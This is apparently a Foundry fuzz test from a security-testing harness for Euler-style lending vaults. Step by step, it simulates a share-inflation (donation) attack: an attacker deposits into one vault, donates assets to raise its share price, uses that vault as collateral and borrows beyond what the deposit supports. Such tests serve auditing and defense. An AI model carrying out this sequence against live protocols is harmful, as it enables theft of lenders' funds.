// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Setup} from "./Setup.t.sol";
import {HandlerAggregator} from "./HandlerAggregator.t.sol";
import {base} from "./base/BaseHandler.t.sol";
import "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract InflationFuzz is Setup, HandlerAggregator {
    
    function setUp() public virtual override {
        // Init Base
        _setUp();
        actors = _setUpActors();
        
        if (address(eTST2) == address(0)) return;

        // Configure eTST to accept eTST2 as collateral
        vm.prank(eTST.governorAdmin());
        eTST.setLTV(address(eTST2), 0.8e4, 0.9e4, 0); // 80% LTV
    }

    /// @notice The Attack Scenario
    function testFuzz_InflationAttack(uint256 donateAmount, uint256 borrowAmount) public {
        // Constraints
        donateAmount = bound(donateAmount, 1e18, 1e24); // Reasonable range
        // borrowAmount not used directly, we calculate max
        
        address attacker = actors[0];
        vm.startPrank(attacker);
        
        // 1. Attacker gets Asset B (underlying of eTST2)
        address assetB = eTST2.asset();
        deal(assetB, attacker, donateAmount * 2);
        
        // 2. Attacker deposits into eTST2 (1 share = 1 asset initially)
        uint256 depositPart = donateAmount; 
        IERC20(assetB).approve(address(eTST2), depositPart);
        uint256 shares = eTST2.deposit(depositPart, attacker);
        
        // 3. Enable eTST2 as collateral for eTST
        evc.enableCollateral(address(attacker), address(eTST2));
        
        // 4. ATTACK: Inflate eTST2
        IERC20(assetB).transfer(address(eTST2), donateAmount);
        
        // 5. Check Borrow Power
        // PPS should be approx 2.0 (deposit = donate)
        // Collateral Value = shares * PPS * LTV
        // If PPS is 2, value is ~2 * deposit.
        // Borrow Capacity = 0.8 * Value = 1.6 * deposit.
        
        uint256 assetsPerShare = eTST2.convertToAssets(1e18);
        console.log("PPS (1e18):", assetsPerShare);
        
        uint256 totalAssetsBacking = eTST2.convertToAssets(shares);
        uint256 maxBorrow = (totalAssetsBacking * 8000) / 10000;
        
        console.log("Deposit:", depositPart);
        console.log("Donation:", donateAmount);
        console.log("Shares:", shares);
        console.log("Backing Assets (Inflated):", totalAssetsBacking);
        console.log("Max Borrow:", maxBorrow);
        
        // 6. Borrow from eTST (Asset A)
        // Need to ensure eTST has liquidity.
        address assetA = eTST.asset();
        deal(assetA, address(eTST), maxBorrow * 2); // Fund the vault
        
        // Try to borrow almost max
        uint256 borrowAmt = (maxBorrow * 99) / 100;
        
        if (borrowAmt > 0) {
            eTST.borrow(borrowAmt, attacker);
            console.log("Borrow SUCCESS:", borrowAmt);
            
            // This proves we used the inflated value.
            // If we only used 'deposit' value, we could only borrow ~0.8 * deposit.
            // Here we borrowed ~1.6 * deposit.
            // So Inflation works.
            
            if (borrowAmt > (depositPart * 8000) / 10000) {
                console.log("CONFIRMED: Borrowed more than initial capital would allow.");
            }
        }
        
        vm.stopPrank();
    }
}
